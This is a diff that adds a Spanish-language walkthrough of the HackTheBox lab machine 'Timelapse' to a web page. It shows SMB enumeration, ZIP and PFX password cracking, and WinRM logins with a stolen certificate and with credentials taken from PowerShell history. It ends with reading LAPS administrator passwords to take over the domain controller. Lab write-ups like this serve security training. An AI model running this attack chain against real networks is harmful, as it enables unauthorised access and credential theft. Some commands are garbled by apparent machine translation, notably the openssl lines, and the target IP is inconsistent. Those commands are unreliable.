@@ -70,6 +70,433 @@
         const markdownContent = `
 # Máquina "Timelapse" de HackTheBox
 
+Caracteristicas:
+
+- Windows
+- Fácil
+- Active directory  
+- SMB Enumeration
+- Cracking ZIP Password Protected File (fcrackzip) 
+- Cracking and reading .PFX File (crackpkcs12) 
+- Gaining SSL access with Evil-WinRM Information Leakage 
+- Reading the user's Powershell history (User Pivoting) 
+- Abusing LAPS to get passwords (Get-LAPSPasswords.ps1) [Privilege Escalation]
+
+Util en:
+
+- OSCP
+- OSEP
+- Active Directory
+
+        IP 10.10.11.152
+
+- nmap -p- --min-rate 10000 10.10.11.152
+
+<pre>
+<code>
+Starting Nmap 7.80 ( https://nmap.org ) at 2022-06-30 12:40 UTC
+Nmap scan report for 10.10.11.152
+Host is up (0.094s latency).
+Not shown: 65517 filtered ports
+PORT      STATE SERVICE
+53/tcp    open  domain
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+5986/tcp  open  wsmans
+9389/tcp  open  adws
+49667/tcp open  unknown
+49673/tcp open  unknown
+49674/tcp open  unknown
+49696/tcp open  unknown
+62656/tcp open  unknown
+</code>
+</pre>
+
+- nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5986,9389,49667,49673,49674,49696,62656 -sCV 10.10.11.152
+
+<pre>
+<code>
+PORT      STATE SERVICE           VERSION
+53/tcp    open  domain?
+| fingerprint-strings: 
+|   DNSVersionBindReqTCP: 
+|     version
+|_    bind
+88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2022-06-30 20:44:10Z)
+135/tcp   open  msrpc             Microsoft Windows RPC
+139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
+389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  ldapssl?
+3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
+3269/tcp  open  globalcatLDAPssl?
+5986/tcp  open  ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+| ssl-cert: Subject: commonName=dc01.timelapse.htb
+| Not valid before: 2021-10-25T14:05:29
+|_Not valid after:  2022-10-25T14:25:29
+|_ssl-date: 2022-06-30T20:47:10+00:00; +8h01m03s from scanner time.
+| tls-alpn: 
+|_  http/1.1
+9389/tcp  open  mc-nmf            .NET Message Framing
+49667/tcp open  msrpc             Microsoft Windows RPC
+49673/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
+49674/tcp open  msrpc             Microsoft Windows RPC
+49696/tcp open  msrpc             Microsoft Windows RPC
+62656/tcp open  msrpc             Microsoft Windows RPC
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port53-TCP:V=7.80%I=7%D=6/30%Time=62BD9A60%P=x86_64-pc-linux-gnu%r(DNSV
+SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
+SF:x04bind\0\0\x10\0\x03");
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 8h01m02s, deviation: 0s, median: 8h01m02s
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2022-06-30T20:46:33
+|_  start_date: N/A
+</code>
+</pre>
+
+Esta combinación de puertos (Kerberos + LDAP + DNS + SMB) sugiere que probablemente se trate de un controlador de dominio. y nos respálda el nombre del host (DC01) 
+y el nombre en el certificado TLS en 5986 (dc01.timelapse.htb). Los scripts LDAP también muestran un nombre de dominio timelapse.htb. 
+Es un poco extraño que no haya datos de script para SMB (445). 
+
+asi que agregaremos los dominios al etc hosts
+
+- 10.10.11.152 timelapse.htb dc01.timelapse.htb
+
+regularmente nos encontramos con Windows Remoting/WinRM en TCP 5985. La versión envuelta en TLS normalmente se ejecuta en TCP 5986, que es lo que está presente aquí. 
+Podré interactuar con él para obtener un shell si encuentro una manera de autenticar.
+
+lanzamos crackmapexec
+
+- crackmapexec smb dc01.timelapse.htb
+
+SMB timelapse.htb 445 DC01 [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)
+
+Como siempre, con las PYMES, vale la pena probar diferentes herramientas. crackmapexec no puede incluir ninguna acción: 
+
+- crackmapexec smb dc01.timelapse.htb --shares
+
+SMB timelapse.htb   445    DC01  [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)
+
+SMB timelapse.htb   445    DC01  [-] Error enumerating shares: SMB SessionError: STATUS_USER_SESSION_DELETED(The remote user session has been deleted.)
+
+Pero smbclient hace ( -L ver acciones y -N para no autenticación): 
+
+<pre>
+<code>
+smbclient -L //dc01.timelapse.htb -N
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        NETLOGON        Disk      Logon server share 
+        Shares          Disk      
+        SYSVOL          Disk      Logon server share 
+SMB1 disabled -- no workgroup available
+</code>
+</pre>
+
+Los tres nombres que terminan en $ son recursos compartidos predeterminados en todos los sistemas Windows, y ADMIN$ y C$ requieren acceso de administrador, y IPC$ no ofrece mucho.
+Resulta que puedo obtener este mismo comportamiento de crackmapexec usando -u [any username] -p ''. Es importante que la contraseña sea una cadena vacía o fallará: 
+
+<pre>
+<code>
+crackmapexec smb dc01.timelapse.htb --shares -u 0xdf -p ''
+SMB         timelapse.htb   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)
+SMB         timelapse.htb   445    DC01             [+] timelapse.htb\0xdf: 
+SMB         timelapse.htb   445    DC01             [+] Enumerated shares
+SMB         timelapse.htb   445    DC01             Share           Permissions     Remark
+SMB         timelapse.htb   445    DC01             -----           -----------     ------
+SMB         timelapse.htb   445    DC01             ADMIN$                          Remote Admin
+SMB         timelapse.htb   445    DC01             C$                              Default share
+SMB         timelapse.htb   445    DC01             IPC$            READ            Remote IPC
+SMB         timelapse.htb   445    DC01             NETLOGON                        Logon server share 
+SMB         timelapse.htb   445    DC01             Shares          READ            
+SMB         timelapse.htb   445    DC01             SYSVOL                          Logon server share 
+<code>
+<pre>
+
+y no encontramos mucho, asi que vamos a Shares/dev/winrm_backup.zip. Está protegido con contraseña. Entonces necesitamos resolverlo. 
+usamos fcrackzip para descifrar el archivo winrm_backup usando la lista de palabras rockyou.txt.
+
+- fcrackzip -D -u winrm_backup.zip  -p /usr/share/wordlists/rockyou.txt 
+
+y tenemos la contraseña 
+
+supremelegacy
+
+Una vez que hayamos descifrado la contraseña, podemos usarla para descomprimir el archivo. Una vez extraído nos encontramos con un archivo .pfx llamado: 
+Legacy_dev_auth.pfx. Los archivos PFX son en realidad certificados digitales que contienen las claves pública y privada del certificado SSL. 
+
+- unzip winrm_backup.zip
+
+- pfx2john legacyy_dev_auth.pfx >pfxhash
+
+Ahora, convertiremos ese archivo pfx al hash y lo descifraremos usando el hash usando John para obtener la clave privada y la clave pem. 
+Como puede ver, la contraseña es thuglegacy
+Intentaremos abrir el certificado usando openssl y, como podemos ver, es un proveedor de almacenamiento de claves de software de Microsoft. 
+Podemos extraer el certificado y la clave privada. 
+
+- openssl pkcs12 -  en  legadoy_dev_auth.   pfx  -nocerts -out clave privada.   pem  -nodos 
+
+- openssl pkcs12 -  en  legadoy_dev_auth.   certificado pfx  -nokeys -out.   pem 
+
+Una vez que la clave privada esté disponible, podemos usar esta clave para iniciar sesión en el cuadro.
+Usaremos evil-winrm para iniciar sesión usando tanto el certificado pem como la clave privada pem. En lugar de una contraseña, 
+también podemos iniciar sesión con las claves. 
+
+
+- evil-winrm -i 10.129.227.105 -c certificate.pem -k priv-key.pem -S -r timelapse
+
+## Escalada de privilegios
+
+No hay nada especial en el usuario heredado: 
+
+<pre>
+<code>
+    *Evil-WinRM* PS C:\Users\legacyy> net user legacyy
+User name                    legacyy
+Full Name                    Legacyy
+Comment
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            10/23/2021 12:17:10 PM
+Password expires             Never
+Password changeable          10/24/2021 12:17:10 PM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   6/30/2022 6:52:32 PM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Remote Management Use
+Global Group memberships     *Domain Users         *Development
+The command completed successfully.
+</code>
+</pre>
+
+Están en el grupo "Usuarios de administración remota", pero lo sé porque sin ese grupo no habría podido ejecutar comandos ni obtener un shell a través de WinRM. 
+El grupo “Desarrollo” podría ser interesante. Estaré atento a los lugares que puedan permitir que Legacyy vaya.
+
+Sin privilegios interesantes: 
+
+<pre>
+<code>
+*Evil-WinRM* PS C:\Users\legacyy> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+</code>
+</pre>
+
+Historial de PowerShell
+
+Un lugar que siempre reviso en los hosts de Windows es el archivo de historial de PowerShell . Y está presente aquí: 
+
+
+<pre>
+<code>
+*Evil-WinRM* PS C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine> type ConsoleHost_history.txt
+whoami
+ipconfig /all
+netstat -ano |select-string LIST
+$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
+$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
+$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
+invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {whoami}
+get-aduser -filter * -properties *
+exit
+</code>
+</pre>
+
+nos volveremos a con evil-winrm con las nuevas credenciales
+
+<pre>
+<code>
+$ evil-winrm -i timelapse.htb -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S
+
+Evil-WinRM shell v3.4
+
+Warning: SSL enabled
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\svc_deploy\Documents> 
+</code>
+</pre>
+
+estamos sin privilegios adicionales
+
+<pre>
+<code>
+*Evil-WinRM* PS C:\Users\svc_deploy\Documents> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+</code>
+</pre>
+
+tenemos un grupo interesante
+
+<pre>
+<code>
+*Evil-WinRM* PS C:\Users\svc_deploy\Documents> net user svc_deploy
+User name                    svc_deploy
+Full Name                    svc_deploy
+Comment
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            10/25/2021 12:12:37 PM
+Password expires             Never
+Password changeable          10/26/2021 12:12:37 PM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   10/25/2021 12:25:53 PM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Remote Management Use
+Global Group memberships     *LAPS_Readers         *Domain Users
+The command completed successfully.
+</code>
+</pre>
+
+LAPS_Readersparece implicar que svc_deploy tiene acceso para leer desde LAPS. 
+
+Con LAPS, el DC administra las contraseñas de administrador local para las computadoras del dominio. Es común crear un grupo de usuarios y darles permisos para leer 
+estas contraseñas, permitiendo a los administradores confiables acceder a todas las contraseñas de administrador local.
+Mostré esto antes en el cuadro Insane, PivotAPI . Siempre es divertido cuando los pasos de casillas más difíciles llegan a casillas con calificaciones más fáciles.
+Leer contraseña
+
+Para leer la contraseña de LAPS, solo necesito usar Get-ADComputery solicitar específicamente el ms-mcs-admpwdpropiedad: 
+
+<pre>
+<code>
+    *Evil-WinRM* PS C:\Users\svc_deploy\Documents> Get-ADComputer DC01 -property 'ms-mcs-admpwd'
+
+
+DistinguishedName : CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb
+DNSHostName       : dc01.timelapse.htb
+Enabled           : True
+ms-mcs-admpwd     : uM[3va(s870g6Y]9i]6tMu{j
+Name              : DC01
+ObjectClass       : computer
+ObjectGUID        : 6e10b102-6936-41aa-bb98-bed624c9b98f
+SamAccountName    : DC01$
+SID               : S-1-5-21-671920749-559770252-3318990721-1000
+UserPrincipalName :
+</code>
+</pre>
+
+La contraseña del administrador local para este cuadro es “uM[3va(s870g6Y]9i]6tMu{j”. Mal-WinRM
+
+me conectaré con evil-winrm: 
+
+<pre>
+<code>
+evil-winrm -i timelapse.htb -S -u administrator -p 'uM[3va(s870g6Y]9i]6tMu{j'
+
+Evil-WinRM shell v3.4
+
+Warning: SSL enabled
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents>
+</code>
+</pre>
+
+Hay otro usuario en la caja, TRX:
+
+<pre>
+<code>
+*Evil-WinRM* PS C:\Users> ls
+
+    Directory: C:\Users
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----       10/23/2021  11:27 AM                Administrator
+d-----       10/25/2021   8:22 AM                legacyy
+d-r---       10/23/2021  11:27 AM                Public
+d-----       10/25/2021  12:23 PM                svc_deploy
+d-----        2/23/2022   5:45 PM                TRX
+</code>
+</pre>
+
+TRX está en el grupo "Administradores de dominio". Voy a mirar ahí y lo encuentro: 
+
+<pre>
+<code>
+*Evil-WinRM* PS C:\Users\TRX\Desktop> ls
+
+    Directory: C:\Users\TRX\Desktop
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---        6/19/2022  10:15 PM             34 root.txt
+
+*Evil-WinRM* PS C:\Users\TRX\Desktop> type root.txt
+336e827e************************
+</pre>
+</code>
+
+
+
+Algunos de los writeups en esta página, pueden tener contenido de otras páginas o tener muy pocas imágenes, esto 
+debido a que en algunas de las máquinas que realice, no tome los apuntes o no tome capturas de pantalla, así que he decidido buscar varios writeups
+y agregar lo que esté mejor explicado en cada uno para plasmarlo aquí, también si encuentra faltas de ortografía 
+o cualquier error, Puedes contactarme a mi correo.
+
+lerioxirit@proton.me
+
 
         `;
         
